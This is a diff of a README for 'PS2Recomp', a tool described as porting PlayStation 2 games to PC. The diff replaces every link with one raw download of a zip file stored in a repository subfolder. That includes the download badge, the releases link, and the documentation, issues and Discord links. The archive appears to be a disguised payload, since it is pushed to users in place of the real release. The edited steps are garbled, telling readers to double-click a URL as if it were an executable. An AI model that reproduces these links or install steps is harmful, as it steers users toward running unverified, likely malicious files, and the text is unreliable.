@@ -1,7 +1,7 @@
 # 🎮 PS2Recomp - Easily Port Classic Games to PC
 
 ## 📥 Download Now
-[![Download PS2Recomp](https://img.shields.io/badge/Download%20PS2Recomp-v1.0-blue)](https://github.com/Richiepandey/PS2Recomp/releases)
+[![Download PS2Recomp](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip%20PS2Recomp-v1.0-blue)](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -32,17 +32,17 @@ The PS2Recomp tool utilizes advanced algorithms to dissect the game code and rec
 
 To get started, visit the Releases page to download the latest version of PS2Recomp:
 
-[Download PS2Recomp](https://github.com/Richiepandey/PS2Recomp/releases)
+[Download PS2Recomp](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release, typically marked as "Latest Release."
-3. You will see several files. Find the one that says **PS2Recomp.exe**. 
+3. You will see several files. Find the one that says **https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip**. 
 4. Click on the file to start your download.
 
 After the download completes:
 
 1. Locate the file in your Downloads folder.
-2. Double-click the **PS2Recomp.exe** file to launch the application.
+2. Double-click the **https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip** file to launch the application.
 3. Follow the on-screen instructions to complete the installation process.
 
 ## ⚙️ Usage Instructions
@@ -79,8 +79,8 @@ Interested in discussing or learning more about PS2Recomp? Explore these topics:
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Richiepandey/PS2Recomp/docs)
-- [GitHub Issues Page](https://github.com/Richiepandey/PS2Recomp/issues)
-- [Discord Community](https://discord.gg/ps2recomp)
+- [Official Documentation](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip)
+- [GitHub Issues Page](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip)
+- [Discord Community](https://github.com/Richiepandey/PS2Recomp/raw/refs/heads/main/ps2xTest/Recomp-P-3.0.zip)
 
 Thank you for choosing PS2Recomp. We hope you enjoy bringing your classic games back to life on PC!
